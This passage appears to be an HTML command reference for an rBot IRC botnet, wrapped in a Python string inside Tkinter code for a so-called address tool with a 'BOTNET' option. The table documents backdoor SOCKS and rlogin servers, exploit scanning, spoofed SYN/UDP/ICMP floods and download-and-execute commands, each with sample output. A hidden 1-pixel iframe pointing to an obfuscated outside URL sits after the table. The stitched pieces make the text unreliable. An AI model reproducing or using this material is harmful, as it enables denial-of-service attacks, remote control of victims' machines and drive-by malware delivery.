* camel quit (Quit: later)
</TD>
</TR>

<!--
raw
-->
<TR>
<TD>
raw
</TD>
<TD>
r
</TD>
<TD>
.raw &lt;raw&gt;
</TD>
<TD>
Sends a raw to the server.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .raw QUIT :what.<BR />
* camel quit (Quit: what)
</TD>
</TR>

<!--
readfile
-->
<TR>
<TD>
readfile
</TD>
<TD>
rf
</TD>
<TD>
.readfile &lt;filename&gt;
</TD>
<TD>
Reads the contents of a file.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .read onelinefile.txt<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; This is one line<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Read file complete: onelinefile.txt
</TD>
</TR>

<!--
reboot
-->
<TR>
<TD>
reboot
</TD>
<TD>
&nbsp;
</TD>
<TD>
.reboot
</TD>
<TD>
Reboots the users machine.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .reboot<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Rebooting system.
</TD>
</TR>

<!--
reconnect
-->
<TR>
<TD>
reconnect
</TD>
<TD>
r
</TD>
<TD>
.reconnect
</TD>
<TD>
Reconnects, getting a new ident and nickname.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .reconnect<BR />
* camel has quit (Quit: Client Exited)<BR />
* qewuyuf has joined #moose
</TD>
</TR>

<!--
remove
-->
<TR>
<TD>
remove
</TD>
<TD>
rm
</TD>
<TD>
.remove
</TD>
<TD>
Removes the bot completely.*This will completly delete the bot and its registry so i highly advise you only do this if your closing down your bots or you accidently installed it on your computer*
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .remove<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Removing Bot.
</TD>
</TR>

<!--
rename
-->
<TR>
<TD>
rename
</TD>
<TD>
mv
</TD>
<TD>
.rename &lt;old&gt; &lt;new&gt;
</TD>
<TD>
Renames &lt;old&gt; to &lt;new&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .rename C:\Screenshot.jpg C:\hell.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FILE]: Rename: 'C:\Screenshot' to: 'C:\hell.jpg'.
</TD>
</TR>

<!--
repeat
-->
<TR>
<TD>
repeat
</TD>
<TD>
rp
</TD>
<TD>
.rename &lt;number of times&gt; &lt;command&gt;
</TD>
<TD>
Repeats &lt;command&gt; &lt;times&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .repeat 3 ,privmsg #moose hello<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; hello<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; hello<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; hello
</TD>
</TR>

<!--
rloginserver
-->
<TR>
<TD>
rloginserver
</TD>
<TD>
rlogin
</TD>
<TD>
.rloginserver [port] [username]
</TD>
<TD>
Starts a Rlogin server. Rlogin is what the rBot creators
have done so you can remotely access the bot, without
having be on IRC.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .rloginserver<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [RLOGIND]: Server listening on IP: 216.239.33.101:37, Username: moose.
</TD>
</TR>

<!--
rloginstop
-->
<TR>
<TD>
rloginstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.rloginstop
</TD>
<TD>
Stops a rlogin server.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .rloginstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [RLOGIND]: Server stopped. (1 thread(s) stopped).
</TD>
</TR>

<!--
rndnick
-->
<TR>
<TD>
rndnick
</TD>
<TD>
rn
</TD>
<TD>
.rndnick
</TD>
<TD>
Change to a random nick.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .rndnick<BR />
* camel is now know as howshos
</TD>
</TR>

<!--
secure
-->
<TR>
<TD>
secure
</TD>
<TD>
sec<BR />
unsecure<BR />
unsec
</TD>
<TD>
.secure
</TD>
<TD>
Makes sure that any holes that are exploitable are patched up.
Giving it the "secure" look.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .secure<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SECURE]: Securing system.
</TD>
</TR>

<!--
securestop
-->
<TR>
<TD>
securestop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.securestop
</TD>
<TD>
Stops any securing possible.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .securestop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SECURE]: Securing stopped. (1 thread(s) stopped).
</TD>
</TR>

<!--
server
-->
<TR>
<TD>
server
</TD>
<TD>
se
</TD>
<TD>
.server &lt;new server&gt;
</TD>
<TD>
Updates the server to the new server.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .server irc.dal.net<BR />
&lt;<SPAN class="user">@moose</SPAN>&gt; .reconnect<BR />
[Connects to irc.dal.net...]
</TD>
</TR>

<!--
socks4
-->
<TR>
<TD>
socks4
</TD>
<TD>
s4
</TD>
<TD>
.socks4 [new server] [-a]
</TD>
<TD>
Starts a socks4 server on the computer on the port specified in 
config.h, or by a number given by command.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .socks4<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SOCKS4]: Server started on: 216.239.33.101:28364
</TD>
</TR>

<!--
socks4stop
-->
<TR>
<TD>
socks4stop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.socks4stop
</TD>
<TD>
Stops a socks4 server
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .socks4stop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SOCKS4]: Server stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!--
status
-->
<TR>
<TD>
status
</TD>
<TD>
s
</TD>
<TD>
.status
</TD>
<TD>
Returns the uptime of the bot.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .status<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Status: Ready. Bot Uptime: 11d 4h 3m.
</TD>
</TR>

<!--
sysinfo
-->
<TR>
<TD>
sysinfo
</TD>
<TD>
si
</TD>
<TD>
.sysinfo
</TD>
<TD>
Returns information about the system.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .sysinfo<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [<B>SYSINFO</b>]: [<B>CPU</b>]: 2210MHz. [<B>RAM</b>]: 1,048,576KB total, 649,216KB free.
[<B>Disk</b>]: 10,506,476KB total, 4,446,864KB free. [<B>OS</b>]: Windows XP (Service Pack 1) (5.1, Build 2600).
[<B>Sysdir</b>]: C:\WINDOWS\System32. [<B>Hostname</b>]: microsoft.com (207.46.134.155). [<B>Current User</b>]: Bill Gates.
[<B>Date</b>]: 02:Jun:2004. [<B>Time</b>]: 23:04:47. [<B>Uptime</b>]: 17d 8h 28m.
</TD>
</TR>

<!--
threads
-->
<TR>
<TD>
threads
</TD>
<TD>
t
</TD>
<TD>
.threads
</TD>
<TD>
Lists all the current threads.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .threads<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[Thread List]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 0. [MAIN]: Bot started.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 1. [IDENTD]: Server running on Port: 113.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 2. [TCP]: Spoofed ack flooding: (24.222.212.37:337) for 120 seconds.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 3. [TFTP]: Server started on Port: 2183, File: C:\WINDOWS\System32\commmand.exe, Request: commmand.exe.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 4. [THREADS]: List threads.
</TD>
</TR>

<!--
uptime
-->
<TR>
<TD>
uptime
</TD>
<TD>
up
</TD>
<TD>
.uptime
</TD>
<TD>
Returns the uptime of the system.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .uptime<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Uptime: 17d 8h 28m.
</TD>
</TR>

<!--
version
-->
<TR>
<TD>
version
</TD>
<TD>
ver
</TD>
<TD>
.version
</TD>
<TD>
Outputs the version specified in config.h.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .version<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: rBot-Moose
</TD>
</TR>

<!--
visit
-->
<TR>
<TD>
visit
</TD>
<TD>
v
</TD>
<TD>
.visit &lt;uri&gt; [referrer]
</TD>
<TD>
Visits &lt;uri&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .visit http://www.kernel.org<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [VISIT]: URL visited.
</TD>
</TR>

<!--
who
-->
<TR>
<TD>
who
</TD>
<TD>
&nbsp;
</TD>
<TD>
.who
</TD>
<TD>
Returns who is logged in, and the amount of slots left to fill.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .who<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[Login List]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 0. moose!moose@internet.yahoo.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 1. antelope!deer@i-own.blogspot.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 2. &lt;Empty&gt;<BR />
</TD>
</TR>

<!-- 
Scanning
-->
<TR>
<TD class="headers" style="BACKGROUND: #D1D1D1;">
<A href="#scanning" name="scanning">Scanning Functions</A>
</TD>
</TR>

<!-- 
advscan 
-->
<TR>
<TD>
advscan
</TD>
<TD>
asc
</TD>
<TD>
.advscan &lt;method&gt; &lt;threads&gt; &lt;delay&gt; &lt;length&gt; [ip] [-abr]
</TD>
<TD>
Starts a scan using &lt;method&gt; (check advscan.cpp) for &lt;length&gt; with &lt;threads&gt; on a delay
of &lt;delay&gt;. If -a is specified, starts a scan using the A class on the bot. Likewise with -b. Using -r makes
the rest of the ip become random. If a,b or r aren't specified, the [ip] must be in format: A.B.C.D. X can be used
as one of the numbers, as it is evaluated as a random number.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .advscan netbios 100 5 120 -b -r<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Random Port Scan started on 192.168.x.x:139 with a delay of 5 seconds for 120 minutes using 100 threads.
</TD>
</TR>

<!-- 
scan
-->
<TR>
<TD>
scan
</TD>
<TD>
sc
</TD>
<TD>
.scan &lt;ip&gt; &lt;port&gt; &lt;delay&gt;
</TD>
<TD>
Starts a port scan at &lt;ip&gt;:&lt;port&gt; with delays of &lt;delay&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .scan 24.222.212.37 445 10<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Port scan started: 24.222.212.37:445 with delay: 10(ms).
</TD>
</TR>

<!-- 
scanstats
-->
<TR>
<TD>
scanstats
</TD>
<TD>
stats
</TD>
<TD>
.scanstats
</TD>
<TD>
Returns various information about a scan. Returning how many exploits there has been found.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .scanstats<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Exploit Statistics: WebDav: 0, NetBios: 0, NTPass: 0, Dcom135: 0, Dcom445: 0, Dcom1025: 0, Dcom2: 0, MSSQL: 0, Beagle1: 0, Beagle2: 0, MyDoom: 0, lsass: 10, Optix: 0, UPNP: 0, NetDevil: 0, DameWare: 0, Kuang2: 0, Sub7: 0, Total: 0 in 0d 0h 0m.
</TD>
</TR>

<!-- 
scanstop
-->
<TR>
<TD>
scanstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.scanstop
</TD>
<TD>
Stops whatever scans are in progress and kills the threads.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .scanstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Scan stopped. (11 thread(s) stopped.)
</TD>
</TR>

<!--
Clones
-->
<TR>
<TD class="headers">
<A href="#clones" name="clones">Clone Functions</A>
</TD>
</TR>

<!-- 
c_action
-->
<TR>
<TD>
c_action
</TD>
<TD>
c_a
</TD>
<TD>
.c_action &lt;thread&gt; &lt;channel/user&gt; &lt;message&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to do an action to &lt;channel/user&gt; with
&lt;message&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_action 1 #help partially stabz self<BR />
[In #help...]<BR />
* clonal partially stabz self
</TD>
</TR>

<!--
c_join
-->
<TR>
<TD>
c_join
</TD>
<TD>
c_j
</TD>
<TD>
.c_join &lt;thread&gt; &lt;channel&gt; [key]
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to join &lt;channel&gt; with [key]
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_join 1 #Chat<BR />
[In #Chat...]<BR />
* clonal has join #Chat
</TD>
</TR>

<!-- 
c_mode 
-->
<TR>
<TD>
c_mode
</TD>
<TD>
c_m
</TD>
<TD>
.c_mode &lt;thread&gt; &lt;channel&gt; &lt;modes&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to do &lt;modes&gt; in &lt;channel&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_mode 1 #chat +o moose<BR />
[In #Chat...]<BR />
* clonal has set mode +o moose
</TD>
</TR>

<!-- 
c_nick 
-->
<TR>
<TD>
c_nick
</TD>
<TD>
c_n
</TD>
<TD>
.c_nick &lt;thread&gt; &lt;new nick&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to change nicks to &lt;new nick&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_nick 1 clenal<BR />
* clonal is now know as clenal
</TD>
</TR>

<!-- 
c_privmsg 
-->
<TR>
<TD>
c_privmsg
</TD>
<TD>
c_pm
</TD>
<TD>
.c_privmsg &lt;thread&gt; &lt;channel/user&gt; &lt;message&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to send &lt;message&gt; to &lt;channel/user&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_privmsg 1 #chat Hello lusers.<BR />
[In #Chat...]<BR />
&lt;clonal&gt; Hello lusers.
</TD>
</TR>

<!-- 
c_quit 
-->
<TR>
<TD>
c_quit
</TD>
<TD>
c_q
</TD>
<TD>
.c_quit &lt;thread&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to quit.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_quit 1<BR />
* clone has quit (Quit: later.)
</TD>
</TR>

<!--
c_raw 
-->
<TR>
<TD>
c_raw
</TD>
<TD>
c_r
</TD>
<TD>
.c_raw &lt;thread&gt; &lt;irc raw&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to send &lt;irc raw&gt; to the server
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_raw 1 QUIT :wut<BR />
* clone has quit (Quit: wut)
</TD>
</TR>

<!-- 
c_rndnick
-->
<TR>
<TD>
c_rndnick
</TD>
<TD>
c_rn
</TD>
<TD>
.c_rndnick &lt;thread&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to change to a random nick.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_rndnick<BR />
* clone is now know as esfgisd
</TD>
</TR>

<!--
DDoS Floods
-->
<TR>
<TD class="headers">
<A href="#ddos" name="ddos">DDoS Functions</A>
</TD>
</TR>

<!-- 
ddos.stop
-->
<TR>
<TD>
ddos.stop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.ddos.stop
</TD>
<TD>
Stops whatever DDoS threads there are.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .ddos.stop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DDoS] DDoS flood stopped. (1 thread(s) stopped)
</TD>
</TR>

<!-- 
ddos.syn
ddos.ack
ddos.random
-->
<TR>
<TD>
ddos.syn<BR />
ddos.ack<BR />
ddos.random<BR />
</TD>
<TD>
&nbsp;
</TD>
<TD>
.ddos.syn &lt;ip&gt; &lt;port&gt; &lt;length&gt;<BR />
.ddos.ack &lt;ip&gt; &lt;port&gt; &lt;length&gt;<BR />
.ddos.random &lt;ip&gt; &lt;port&gt; &lt;length&gt;<BR />
</TD>
<TD>
Starts a DDoS (syn, ack, or random) on &lt;ip&gt;:&lt;port&gt; for &lt;length&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .ddos.random<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DDoS]: Flooding: (24.222.212.37:337) for 120 seconds.
</TD>
</TR>

<!-- 
icmpflood
-->
<TR>
<TD>
icmpflood
</TD>
<TD>
icmp
</TD>
<TD>
.icmpflood &lt;ip&gt; &lt;length&gt; [-r]
</TD>
<TD>
Starts a ICMP flood on &lt;ip&gt; for &lt;length&gt;. If -r is present
it spoofs the IP's.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .icmpflood 24.222.212.37 120 -r<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [ICMP]: Flooding: (24.222.212.37) for 60 seconds.
</TD>
</TR>

<!-- 
pingflood
-->
<TR>
<TD>
pingflood
</TD>
<TD>
ping<BR />
p
</TD>
<TD>
.pingflood &lt;ip&gt; &lt;packets&gt; &lt;size of packets&gt; &lt;delay&gt;
</TD>
<TD>
Sends &lt;number of packets&gt; to &lt;ip&gt; with sizes of &lt;size&gt; and
a delay of &lt;delay&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .pingflood 24.222.212.37 120 1000 4096 100<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [UDP]: Sending 1000 packets to: 24.222.212.37. Packet size: 4096, Delay: 100(ms).
</TD>
</TR>

<!-- 
pingstop
-->
<TR>
<TD>
pingstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.pingstop
</TD>
<TD>
Stops a pingflood.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .pingstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PING] Ping flood stopped. (1 thread(s) stopped)
</TD>
</TR>

<!-- 
synflood
-->
<TR>
<TD>
synflood
</TD>
<TD>
syn
</TD>
<TD>
.synflood &lt;ip&gt; &lt;port&gt; &lt;length&gt;
</TD>
<TD>
Synfloods &lt;ip&gt;:&lt;port&gt; for &lt;length&gt; seconds.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .synflood 24.222.212.37 337 120<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SYN]: Flooding: (24.222.212.37:337) for 120 seconds.
</TD>
</TR>

<!-- 
synstop
-->
<TR>
<TD>
synstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.synstop
</TD>
<TD>
Stops a synflood.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .pingstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SYN]: Syn flood stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!-- 
tcpflood
-->
<TR>
<TD>
tcpflood
</TD>
<TD>
tcp
</TD>
<TD>
.tcpflood &lt;method&gt; &lt;ip&gt; &lt;port&gt; &lt;length&gt; [-r]
</TD>
<TD>
Methods can be: syn, ack or random. TCP floods &lt;ip&gt;:&lt;port&gt; for &lt;length&gt; seconds.
If -r is specified, flood is spoofed.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .tcpflood ack 24.222.212.37 337 120 -r<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [TCP]: Spoofed ack flooding: (24.222.212.37:337) for 120 seconds.
</TD>
</TR>

<!-- 
udpflood
-->
<TR>
<TD>
udpflood
</TD>
<TD>
udp<BR />
u
</TD>
<TD>
.udpflood &lt;ip&gt; &lt;packets&gt; &lt;size of&gt; &lt;delay&gt; [port]
</TD>
<TD>
UDPfloods &lt;ip&gt;:[port] (&lt;packets&gt;, all sizes of &lt;size of&gt;) with a &lt;delay&gt; second delay
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .udpflood 24.222.212.37 1000 4096 100<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [UDP]: Sending 1000 packets to: 24.222.212.37. Packet size: 4096, Delay: 100(ms).
</TD>
</TR>

<!-- 
udpstop
-->
<TR>
<TD>
udpstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.udpstop
</TD>
<TD>
Stops a UDP flood.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .udpstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [UDP] UDP flood stopped. (1 thread(s) stopped)
</TD>
</TR>

<!--
Updating and downloading
-->
<TR>
<TD class="headers">
<A href="#download_update" name="download_update">Downloads</A>
</TD>
</TR>

<!--
download
-->
<TR>
<TD>
download
</TD>
<TD>
dl
</TD>
<TD>
.download &lt;url&gt; &lt;destination&gt; &lt;action&gt;
</TD>
<TD>
Downloads &lt;url&gt; and saves to &lt;destination&gt;. If &lt;action&gt; is 1, file
is also executed, otherwise it is just saved.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .download http://nsa.gov/file.exe c:\windows\devldr32.exe 1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DOWNLOAD]: Downloading URL: http://nsa.gov/file.exe to: c:\windows\devldr32.exe.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DOWNLOAD]: Downloaded 92.1 KB to c:\windows\devldr32.exe @ 92.1 KB/sec.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DOWNLOAD]: Opened: c:\windows\devldr32.exe.
</TD>
</TR>

<!--
update
-->
<TR>
<TD>
update
</TD>
<TD>
&nbsp;
</TD>
<TD>
.update &lt;url&gt; &lt;id&gt;
</TD>
<TD>
If &lt;id&gt; is different that of already on there, the file is downloaded and updated.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .update http://nsa.gov/file.exe mouse1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [UPDATE]: Downloading update from: http://nsa.gov/file.exe.
</TD>
</TR>

<!--
Redirecting
-->
<TR>
<TD class="headers">
<A href="#redirecting" name="redirecting">Redirecting</A>
</TD>
</TR>

<!--
redirect
-->
<TR>
<TD>
redirect
</TD>
<TD>
rd
</TD>
<TD>
.redirect &lt;local port&gt; &lt;remote host&gt; &lt;remote port&gt;
</TD>
<TD>
Creates a simple TCP redirection. A basic port forwarding section.
Will forward all connections to &lt;local port&gt; to &lt;remote host&gt;:&lt;remote port&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .redirect 80 www.google.com 80<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [REDIRECT]: TCP redirect created from: 207.46.134.155:80 to: www.google.com:80.
</TD>
</TR>

<!--
redirectstop
-->
<TR>
<TD>
redirectstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.redirectstop &lt;thread&gt;
</TD>
<TD>
Stops a redirection.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .redirectstop 1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [REDIRECT] TCP redirect stopped. (1 thread(s) stopped)
</TD>
</TR>

<!--
TFTP Server
-->
<TR>
<TD class="headers">
<A href="#ftp" name="ftp">FTP Functions<A/>
</TD>
</TR>

<!--
tftpserver
-->
<TR>
<TD>
tftpserver
</TD>
<TD>
tftp
</TD>
<TD>
.tftpserver
</TD>
<TD>
I'm not sure what this does at the moment. I'm sure I'll work it out :-P
</TD>
<TD>
&nbsp;
</TD>
</TR>

<!--
tftpstop
-->
<TR>
<TD>
tftpstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.tftpstop
</TD>
<TD>
Stops a TFTP (Server? Download? Upload?)
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .tftpstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [TFTP] Server stopped. (1 thread(s) stopped)
</TD>
</TR>

<!--
upload
-->
<TR>
<TD>
upload
</TD>
<TD>
&nbsp;
</TD>
<TD>
.upload (something)
</TD>
<TD>
I have absolutely <B>no</b> idea how this one works.
</TD>
<TD>
&nbsp;
</TD>
</TR>

</TABLE>
<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
</body>
</HTML>"""
        
        # Show login screen
        self.show_login()
        
    def setup_styles(self):
        """Setup custom styles for the GUI"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('TFrame', background='#2b2b2b')
        style.configure('TLabel', background='#2b2b2b', foreground='white')
        style.configure('TButton', background='#4a4a4a', foreground='white')
        style.map('TButton', background=[('active', '#5a5a5a')])
        style.configure('TCombobox', fieldbackground='#3a3a3a', background='#3a3a3a', foreground='white')
        
    def create_widgets(self):
        """Create all GUI widgets"""
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        
        # Title
        title_label = tk.Label(main_frame, text="Regenerative Addresses Tool", 
                               font=('Arial', 16, 'bold'), bg='#2b2b2b', fg='#00ff00')
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
        
        # Address type selection
        ttk.Label(main_frame, text="Address Type:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.address_type = ttk.Combobox(main_frame, values=[
            "Link Regenerator",
            "Proxy Address",
            "IPv4 Address",
            "IPv6 Address", 
            "MAC Address",
            "Email Address",
            "Phone Number",
            "UUID",
            "Bitcoin Address",
            "SSH Key Fingerprint",
            "BOTNET"
        ], state="readonly", width=25)
        self.address_type.grid(row=1, column=1, sticky=tk.W, pady=5, padx=(10, 0))
        self.address_type.set("Link Regenerator")
        self.address_type.bind('<<ComboboxSelected>>', self.on_type_change)
        
        # Generate button
        generate_btn = ttk.Button(main_frame, text="Generate Address", command=self.generate_address)
        generate_btn.grid(row=1, column=2, padx=(20, 0), pady=5)
        
        # Options frame
        options_frame = ttk.LabelFrame(main_frame, text="Options", padding="10")
        options_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)
        options_frame.columnconfigure(1, weight=1)
        
        # Quantity
        ttk.Label(options_frame, text="Quantity:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.quantity_var = tk.StringVar(value="1")
        quantity_spinbox = ttk.Spinbox(options_frame, from_=1, to=100, textvariable=self.quantity_var, width=10)
        quantity_spinbox.grid(row=0, column=1, sticky=tk.W, pady=2, padx=(10, 0))
        
        # Seed for reproducible generation
        ttk.Label(options_frame, text="Seed (optional):").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.seed_var = tk.StringVar()
        seed_entry = ttk.Entry(options_frame, textvariable=self.seed_var, width=30)
        seed_entry.grid(row=1, column=1, sticky=tk.W, pady=2, padx=(10, 0))
        
        # Format options
        ttk.Label(options_frame, text="Format:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.format_var = tk.StringVar(value="Plain")
        format_combo = ttk.Combobox(options_frame, textvariable=self.format_var, 
                                    values=["Plain", "JSON", "CSV", "Hex"], state="readonly", width=15)
        format_combo.grid(row=2, column=1, sticky=tk.W, pady=2, padx=(10, 0))
        
        # Link input frame (for Link Regenerator)
        self.link_frame = ttk.LabelFrame(main_frame, text="Link Input", padding="10")
        self.link_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)
        self.link_frame.columnconfigure(0, weight=1)
        
        ttk.Label(self.link_frame, text="Paste Link Here:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.link_input = tk.Text(self.link_frame, height=3, width=80, bg='#1a1a1a', fg='white')
        self.link_input.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=5)
        
        # Regenerate button for links
        self.regenerate_btn = ttk.Button(self.link_frame, text="Regenerate Link", command=self.regenerate_link)
        self.regenerate_btn.grid(row=2, column=0, pady=5)
        
        # HTML input frame (for BOTNET)
        self.html_frame = ttk.LabelFrame(main_frame, text="HTML Code Input", padding="10")
        self.html_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)
        self.html_frame.columnconfigure(0, weight=1)
        self.html_frame.grid_remove()  # Initially hidden
        
        ttk.Label(self.html_frame, text="Paste HTML Code Here:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.html_input = tk.Text(self.html_frame, height=8, width=80, bg='#1a1a1a', fg='white')
        self.html_input.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=5)
        
        # Process button for HTML
        self.process_btn = ttk.Button(self.html_frame, text="Process HTML", command=self.process_html)
        self.process_btn.grid(row=2, column=0, pady=5)
        
        # Results area
        results_frame = ttk.LabelFrame(main_frame, text="Generated Addresses", padding="10")
